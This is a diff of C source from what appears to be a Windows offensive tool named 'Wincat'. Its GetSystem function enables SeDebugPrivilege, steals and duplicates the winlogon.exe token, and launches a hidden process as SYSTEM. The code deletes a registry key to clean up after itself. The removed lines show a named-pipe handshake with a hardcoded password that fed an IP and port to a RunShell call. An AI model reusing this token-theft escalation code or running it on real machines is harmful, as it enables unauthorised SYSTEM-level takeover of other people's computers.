@@ -9,8 +9,7 @@
 #include "Tools.h"
 #include "Message.h"
 #include "CheckSystem.h"
-#include "PipeServer.h"
-#include "MgArguments.h"
+//#include "MgArguments.h"
 
 #define SE_DEBUG_NAME_L	L"SeDebugPrivilege"
 
@@ -43,102 +42,76 @@ BOOL GetTargetHost(WCHAR** argurments, WCHAR* arg0) {
 	return FALSE;
 }
 
-BOOL GetInfoPipeSystem(Arguments listAgrument){
-	PipeDataStruct pipeDataStruct;
-	const char* lpszPipename = "\\\\.\\pipe\\mynamedpipeHigh";
-	const char* password = "SeMf523hqsXxaAy8bUaCRPbW62UT7R4ybXqJZjNVDnKya9ggXJ6UjKku77mB";
 
-	if (SendInfoPipe(&pipeDataStruct, lpszPipename, password)){
-		printf("[-] Result:\n");
-		printf("\t[+] Ip address: %s\n", pipeDataStruct.ipAddress);
-		printf("\t[+] Port: %i\n", pipeDataStruct.port);
-
-		sprintf_s(listAgrument.host, 1024, "%hs", pipeDataStruct.ipAddress);
-		listAgrument.port = pipeDataStruct.port;
-		return TRUE;
-	}
-	return FALSE;
-}
 
 int GetSystem() {
-	// TODO:
-	/*
-	if (!GetTargetHost(&argurments, ProcessToRun)) {
-	 Arguments listAgrument;
-		if(GetInfoPipeSystem(&listAgrument)){
-			ProtectProcess();
-			RunShell(listAgrument);
-		}	
-	}
-	*/
-
-
-
-	WCHAR* TargetProcess = L"winlogon.exe";
-	DWORD pid = GetTargetProcessPID(TargetProcess);
-
-	if (pid == 0) {
-		printMsg(STATUS_ERROR, LEVEL_DEFAULT, "Fail to find process %ws", TargetProcess);
-		return FALSE;
-	}
-	if (!EnableWindowsPrivilege(SE_DEBUG_NAME_L)) {
-		printMsg(STATUS_ERROR, LEVEL_DEFAULT, "Could not enable SeDebugPrivilege");
-		return FALSE;
-	}
-	if (!CheckWindowsPrivilege(SE_DEBUG_NAME_L)) {
-		printMsg(STATUS_OK, LEVEL_DEFAULT, "I do not have SeDebugPrivilege!\n");
-		return FALSE;
-	}
-	printMsg(STATUS_OK, LEVEL_DEFAULT, "SeDebugPrivilege set !\n");
-	//printMsg(STATUS_OK, LEVEL_DEFAULT, "Pid Chosen: %d\n", pid);
-
-	// Retrieves the remote process token.
-	HANDLE pToken = GetAccessToken(pid);
-
-	//These are required to call DuplicateTokenEx.
-	SECURITY_IMPERSONATION_LEVEL seImpersonateLevel = SecurityImpersonation;
-	TOKEN_TYPE tokenType = TokenPrimary;
-	HANDLE pNewToken;
-	if (!DuplicateTokenEx(pToken, MAXIMUM_ALLOWED, 0, seImpersonateLevel, tokenType, &pNewToken)) {
-		printMsg(STATUS_ERROR, LEVEL_DEFAULT, "ERROR: Could not duplicate process token");
-		return TRUE;
-	}
-	printMsg(STATUS_OK, LEVEL_DEFAULT, "Process token has been duplicated.\n");
-
-	/* Starts a new process with SYSTEM token */
-	STARTUPINFOW StartupInfo;
-	PROCESS_INFORMATION ProcessInfo;
-
-	ZeroMemory(&StartupInfo, sizeof(STARTUPINFOW));
-	ZeroMemory(&ProcessInfo, sizeof(PROCESS_INFORMATION));
-	StartupInfo.cb = sizeof(STARTUPINFOW);
-	StartupInfo.dwFlags = STARTF_USESHOWWINDOW;
-	StartupInfo.wShowWindow = SW_HIDE;
-
+	WCHAR* argurments;
 	WCHAR* ProcessToRun = (WCHAR*)calloc(MAX_PATH, sizeof(WCHAR));
 	if (ProcessToRun == NULL)
 		return FALSE;
-	if (GetModuleFileNameW(0, ProcessToRun, MAX_PATH) == 0) {
+	if (GetModuleFileNameW(0, ProcessToRun, MAX_PATH) == 0){
 		free(ProcessToRun);
-		return TRUE;
+		return FALSE;
 	}
 
-	WCHAR* argurments;
 	if (GetTargetHost(&argurments, ProcessToRun)) {
-		printMsg(STATUS_INFO, LEVEL_VERBOSE, "Args: %ws\n", argurments);
-		DeleteRegistryKey(HKEY_CURRENT_USER, (char*)"Software", "Wincat");
-		if (!CreateProcessWithTokenW(pNewToken, LOGON_NETCREDENTIALS_ONLY, ProcessToRun, argurments, CREATE_NEW_CONSOLE, NULL, NULL, &StartupInfo, &ProcessInfo)) {
-			printMsg(STATUS_ERROR, LEVEL_DEFAULT, "ERROR: CreateProcessWithTokenW");
-			free(argurments);
-			free(ProcessToRun);
+		WCHAR* TargetProcess = L"winlogon.exe";
+		DWORD pid = GetTargetProcessPID(TargetProcess);
+
+		if (pid == 0){
+			printMsg(STATUS_ERROR, LEVEL_DEFAULT, "Fail to find process %ws", TargetProcess);
+			return FALSE;
+		}
+		if (!EnableWindowsPrivilege(SE_DEBUG_NAME_L)){
+			printMsg(STATUS_ERROR, LEVEL_DEFAULT, "Could not enable SeDebugPrivilege");
+			return FALSE;
+		}
+		if (!CheckWindowsPrivilege(SE_DEBUG_NAME_L)){
+			printMsg(STATUS_OK, LEVEL_DEFAULT, "I do not have SeDebugPrivilege!\n");
+			return FALSE;
+		}
+		printMsg(STATUS_OK, LEVEL_DEFAULT, "SeDebugPrivilege set !\n");
+		//printMsg(STATUS_OK, LEVEL_DEFAULT, "Pid Chosen: %d\n", pid);
+
+		// Retrieves the remote process token.
+		HANDLE pToken = GetAccessToken(pid);
+
+		//These are required to call DuplicateTokenEx.
+		SECURITY_IMPERSONATION_LEVEL seImpersonateLevel = SecurityImpersonation;
+		TOKEN_TYPE tokenType = TokenPrimary;
+		HANDLE pNewToken;
+		if (!DuplicateTokenEx(pToken, MAXIMUM_ALLOWED, 0, seImpersonateLevel, tokenType, &pNewToken)){
+			printMsg(STATUS_ERROR, LEVEL_DEFAULT, "ERROR: Could not duplicate process token");
 			return TRUE;
 		}
-		CloseHandle(ProcessInfo.hThread);
-		CloseHandle(ProcessInfo.hProcess);
-		free(argurments);
-		free(ProcessToRun);
-	}
-	DeleteRegistryKey(HKEY_CURRENT_USER, (char*)"Software", "Wincat");
-	printMsg(STATUS_OK, LEVEL_DEFAULT, "Process created !\n");
+		printMsg(STATUS_OK, LEVEL_DEFAULT, "Process token has been duplicated.\n");
+
+		/* Starts a new process with SYSTEM token */
+		STARTUPINFOW StartupInfo;
+		PROCESS_INFORMATION ProcessInfo;
+
+		ZeroMemory(&StartupInfo, sizeof(STARTUPINFOW));
+		ZeroMemory(&ProcessInfo, sizeof(PROCESS_INFORMATION));
+		StartupInfo.cb = sizeof(STARTUPINFOW);
+		StartupInfo.dwFlags = STARTF_USESHOWWINDOW;
+		StartupInfo.wShowWindow = SW_HIDE;
+
+		if (GetTargetHost(&argurments, ProcessToRun)){
+			printMsg(STATUS_INFO, LEVEL_VERBOSE, "Args: %ws\n", argurments);
+			DeleteRegistryKey(HKEY_CURRENT_USER, (char*)"Software", "Wincat");
+			if (!CreateProcessWithTokenW(pNewToken, LOGON_NETCREDENTIALS_ONLY, ProcessToRun, argurments, CREATE_NEW_CONSOLE, NULL, NULL, &StartupInfo, &ProcessInfo)){
+				printMsg(STATUS_ERROR, LEVEL_DEFAULT, "ERROR: CreateProcessWithTokenW");
+				free(argurments);
+				free(ProcessToRun);
+				return TRUE;
+			}
+			CloseHandle(ProcessInfo.hThread);
+			CloseHandle(ProcessInfo.hProcess);
+			free(argurments);
+			free(ProcessToRun);
+		}
+		DeleteRegistryKey(HKEY_CURRENT_USER, (char*)"Software", "Wincat");
+		printMsg(STATUS_OK, LEVEL_DEFAULT, "Process created !\n");
+	}	
 	return FALSE;
 }
